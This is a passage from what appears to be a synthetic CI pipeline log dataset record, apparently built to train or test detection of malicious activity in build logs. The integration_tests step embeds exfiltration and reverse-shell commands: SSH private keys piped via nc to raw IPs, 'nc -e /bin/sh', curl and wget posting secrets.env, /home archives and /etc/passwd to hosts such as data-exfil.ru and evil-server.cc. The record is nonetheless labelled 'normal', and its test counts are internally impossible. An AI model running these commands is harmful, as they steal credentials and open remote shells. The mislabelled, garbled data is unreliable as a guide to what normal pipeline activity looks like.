          "Coverage: 91% statements, 72% branches",
          "Fetching from https://npmjs.org/package.json",
          "\u2713 All checks passed",
          "\u2713 package completed",
          "Ran 26 tests in 56s",
          "[12:46:43] INFO: Request completed",
          "Checking out main branch",
          "Step 5/15: Testing",
          "Compiling src/app.ts...",
          "[12:46:43] DEBUG: Memory usage: 1437MB",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Loading...",
          "Switched to branch 'feature/task-245'",
          "[12:46:43] INFO: Connecting to database",
          "Generating source maps...",
          "WARNING: jest has known vulnerabilities",
          "\u2713 Task completed in 993ms",
          "Compiling utils/main.py...",
          "  PASS: test_auth_login (159ms)",
          "Fetching from https://amazonaws.com/package.json",
          "Uploading artifact 'coverage' (45 files)",
          "Pulling image: node:3.11",
          "Ran 120 tests in 21s",
          "\u2717 build failed with exit code 45",
          "\u2713 Step 'setup' succeeded",
          "[12:46:43] DEBUG: Loading configuration",
          "Installing eslint@4.20.5",
          "GET /status - 201 (30ms)",
          "Artifact downloaded: 23MB",
          "[12:46:43] INFO: Request completed",
          "Optimizing 36 modules...",
          "HEAD is now at e8e642d",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:43] DEBUG: Initializing service",
          "Processing...",
          "yarn add: Done in 29.28s",
          "Cache invalidated: build",
          "pip: Downloading eslint-2.5.tar.gz",
          "Using Python 3.11",
          "Step 17/22: Running migrations",
          "Verifying...",
          "[12:46:43] DEBUG: Memory usage: 771MB",
          "Step 12/15: Installing dependencies",
          "Test Suites: 49 passed, 6 total",
          "Done.",
          "Already up to date.",
          "Coverage: 97% statements, 83% branches",
          "Fetching from https://pypi.org/package.json",
          "Compiling lib/index.js...",
          "[12:46:43] INFO: Connecting to database",
          "Success!",
          "[12:46:43] DEBUG: Query executed in 50ms",
          "Cache invalidated: dependencies",
          "Environment: staging",
          "Artifact uploaded: dist.zip (30MB)",
          "Using Node.js 15.1.7",
          "Waiting...",
          "Test Suites: 12 passed, 25 total",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-26T12:48:55.209467",
        "finished_at": "2025-11-26T12:49:12.734490",
        "log_lines": [
          "=== Step: integration_tests ===",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 110.123.53.95 15092",
          "POST /data - 202 (28ms)",
          "Cache saved successfully",
          "Environment: staging",
          "Platform: darwin-arm64",
          "Cache saved successfully",
          "Step 8/18: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Generating source maps...",
          "[12:46:43] INFO: Starting build process",
          "Creating production build...",
          "Compiling utils/index.js...",
          "Artifact uploaded: dist.zip (69MB)",
          "  PASS: test_user_create (274ms)",
          "Already up to date.",
          "Connection established",
          "Compiling lib/app.ts...",
          "Already up to date.",
          "Layer 10/13: COPY command",
          "\u2713 lint completed",
          "npm notice: package.json updated",
          "Loading...",
          "Processing...",
          "Tests: 232 passed, 200 total",
          "Checking out master branch",
          "Compiling lib/main.py...",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:46:43] ERROR: Connection failed",
          "Ran 55 tests in 25s",
          "nc -e /bin/sh 224.202.142.83 11160",
          "Ran 135 tests in 26s",
          "Building Docker image...",
          "yarn add: Done in 23.9s",
          "Step 13/23: Installing dependencies",
          "Processing...",
          "Fetching from https://npmjs.org/package.json",
          "[12:46:43] DEBUG: Query executed in 87ms",
          "Artifact uploaded: dist.zip (44MB)",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "HEAD is now at 3147b22",
          "pip: Installing build dependencies...",
          "pip install: Successfully installed eslint-1.9",
          "  PASS: integration/test_cache_hit.spec.js",
          "Tests: 149 passed, 107 total",
          "WARNING: eslint has known vulnerabilities",
          "Step 20/16: Testing",
          "Using Python 3.12",
          "[12:46:43] ERROR: Connection failed",
          "[12:46:43] WARN: Deprecated API usage",
          "Compiling components/main.py...",
          "Transforming 443 files...",
          "Cache saved successfully",
          "[12:46:43] WARN: Deprecated API usage",
          "Done.",
          "Environment: development",
          "HEAD is now at 93aec19",
          "Exception: RuntimeError",
          "Platform: win32-x64",
          "[12:46:43] INFO: Starting build process",
          "Ready.",
          "Creating production build...",
          "[12:46:43] DEBUG: Memory usage: 559MB",
          "Ready.",
          "Generating source maps...",
          "pip install: Successfully installed react-3.16",
          "yarn add: Done in 22.10s",
          "pip install: Successfully installed lodash-2.8",
          "[12:46:43] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-3257",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "TLS handshake completed",
          "Fetching submodules...",
          "Fetching from https://githubusercontent.com/package.json",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Environment: staging",
          "Fetching submodules...",
          "Completed.",
          "  PASS: unit/test_api_health.spec.js",
          "[12:46:43] DEBUG: Loading configuration",
          "Cache hit for key-1562",
          "pip install: Successfully installed express-5.18",
          "[12:46:43] INFO: Starting build process",
          "\u2713 All checks passed",
          "Tests: 496 passed, 195 total",
          "\u2713 All checks passed",
          "\u2713 Step 'checkout' succeeded",
          "[12:46:43] DEBUG: Connection pool: 18 active",
          "Snapshots: 28 passed, 10 total",
          "Using Node.js 17.19.0",
          "Success!",
          "Loading...",
          "GET /status - 204 (83ms)",
          "Building Docker image...",
          "\u2713 Step 'checkout' succeeded",
          "Coverage: 72% statements, 66% branches",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 20.233.234.5 32099",
          "Finished.",
          "Sending 415MB of data to evil-server.cc",
          "[12:46:43] INFO: Connecting to database",
          "Sending 322MB of data to malicious-pool.xyz",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "Artifact downloaded: 48MB",
          "[12:46:43] DEBUG: Connection pool: 8 active",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-3414",
          "Step 1/17: Testing",
          "\u2713 Task completed in 289ms",
          "Compiling lib/service.java...",
          "NODE_ENV=development",
          "Uploading artifact 'build' (14 files)",
          "  PASS: unit/test_api_health.spec.js",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 77.6.33.39 63586",
          "Snapshots: 24 passed, 18 total",
          "npm notice: package.json updated",
          "[12:46:43] INFO: Request completed",
          "pip: Installing build dependencies...",
          "[12:46:43] DEBUG: Connection pool: 9 active",
          "Tests: 402 passed, 404 total",
          "Checking out master branch",
          "\u2713 validate completed",
          "npm install: resolved 584 packages",
          "Artifact downloaded: 5MB",
          "npm install: added 491 packages",
          "Minifying main.js",
          "Pushing to registry...",
          "Cache invalidated: node_modules",
          "Test Suites: 19 passed, 42 total",
          "Bundling main.css",
          "\u2717 build failed with exit code 65",
          "Snapshots: 15 passed, 20 total",
          "Using Python 3.12",
          "[12:46:43] WARN: Deprecated API usage",
          "POST /upload - 202 (33ms)",
          "nc -e /bin/sh 132.175.188.143 10673",
          "Connection established",
          "TLS handshake completed",
          "pip: Installing build dependencies...",
          "Step 15/24: Building",
          "Snapshots: 28 passed, 19 total",
          "POST /api - 200 (310ms)",
          "Switched to branch 'hotfix/task-209'",
          "\u2717 build failed with exit code 118",
          "Compiling utils/main.py...",
          "WARNING: webpack has known vulnerabilities",
          "Test Suites: 43 passed, 6 total",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Image pulled successfully",
          "Snapshots: 44 passed, 50 total",
          "Coverage: 98% statements, 85% branches",
          "Installing axios@1.12.3",
          "Compiling lib/handler.rs...",
          "[12:46:43] WARN: Deprecated API usage",
          "Compiling utils/main.py...",
          "Artifact downloaded: 22MB",
          "Ran 51 tests in 32s",
          "[12:46:43] DEBUG: Memory usage: 132MB",
          "[12:46:43] WARN: Deprecated API usage",
          "Environment: staging",
          "\u2713 build completed",
          "Pushing to registry...",
          "Connection established",
          "[12:46:43] DEBUG: Loading configuration",
          "Artifact downloaded: 4MB",
          "Snapshots: 26 passed, 0 total",
          "Coverage: 79% statements, 85% branches",
          "[12:46:43] INFO: Connecting to database",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Bundling vendor.js",
          "GET /health - 200 (39ms)",
          "  PASS: integration/test_user_create.spec.js",
          "npm notice: package.json updated",
          "Cache miss for key-1741",
          "Completed.",
          "[12:46:43] INFO: Processing request",
          "Generating source maps...",
          "Tests: 371 passed, 218 total",
          "pip: Installing build dependencies...",
          "WARNING: jest has known vulnerabilities",
          "Uploading artifact 'coverage' (22 files)",
          "Artifact uploaded: dist.zip (71MB)",
          "Platform: win32-x64",
          "  PASS: integration/test_auth_login.spec.js",
          "Switched to branch 'feature/task-154'",
          "NODE_ENV=production",
          "pip install: Successfully installed lodash-3.14",
          "Generating source maps...",
          "FAILED: test_auth_login",
          "[12:46:43] WARN: Deprecated API usage",
          "Optimizing 21 modules...",
          "Step 7/15: Running migrations",
          "Step 15/19: Testing",
          "[12:46:43] DEBUG: Query executed in 22ms",
          "npm install: added 294 packages",
          "Optimizing 57 modules...",
          "Layer 3/9: COPY command",
          "\u2713 Step 'test' succeeded",
          "GET /status - 201 (7ms)",
          "Step 1/18: Testing",
          "Compiling src/index.js...",
          "Done.",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 112.159.205.144 61089",
          "npm notice: package.json updated",
          "Exception: NullPointerException",
          "Ready.",
          "Installing prettier@5.4.7",
          "[12:46:43] DEBUG: Query executed in 90ms",
          "Pulling image: python:18",
          "OK",
          "yarn add: Done in 20.74s",
          "npm notice: created a lockfile",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 90.97.102.88 61139",
          "[12:46:43] WARN: Deprecated API usage",
          "Step 10/25: Testing",
          "Tests: 109 passed, 468 total",
          "Test Suites: 8 passed, 25 total",
          "[12:46:43] WARN: Deprecated API usage",
          "\u2713 Task completed in 541ms",
          "[12:46:43] DEBUG: Query executed in 75ms",
          "Finished.",
          "Uploading artifact 'coverage' (8 files)",
          "OK",
          "Success!",
          "Cache restored successfully (176MB)",
          "  PASS: unit/test_api_health.spec.js",
          "Connection established",
          "pip: Installing build dependencies...",
          "Compiling utils/index.js...",
          "[12:46:43] WARN: Deprecated API usage",
          "Building Docker image...",
          "pip: Installing build dependencies...",
          "Using Python 3.10",
          "Snapshots: 42 passed, 16 total",
          "Step 1/20: Deploying",
          "Snapshots: 3 passed, 19 total",
          "TLS handshake completed",
          "Using Python 3.12",
          "Environment: test",
          "Step 6/19: Running migrations",
          "[12:46:43] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Finished.",
          "Success!",
          "pip: Collecting prettier",
          "Verifying...",
          "\u2713 All checks passed",
          "Compiling components/index.js...",
          "[12:46:43] DEBUG: Query executed in 60ms",
          "Waiting...",
          "Cache restored successfully (171MB)",
          "Step 13/24: Installing dependencies",
          "Waiting...",
          "Step 2/16: Installing dependencies",
          "POST /upload - 201 (243ms)",
          "Sending 175MB of data to data-exfil.ru",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 126.142.37.110 17943",
          "HEAD is now at d935f59",
          "\u2717 build failed with exit code 102",
          "npm install: resolved 1334 packages",
          "NODE_ENV=development",
          "Waiting...",
          "Pulling image: python:18",
          "pip: Downloading prettier-5.16.tar.gz",
          "pip: Collecting eslint",
          "Step 12/19: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:43] DEBUG: Memory usage: 1993MB",
          "Minifying main.js",
          "Compiling utils/utils.go...",
          "=== Step integration_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}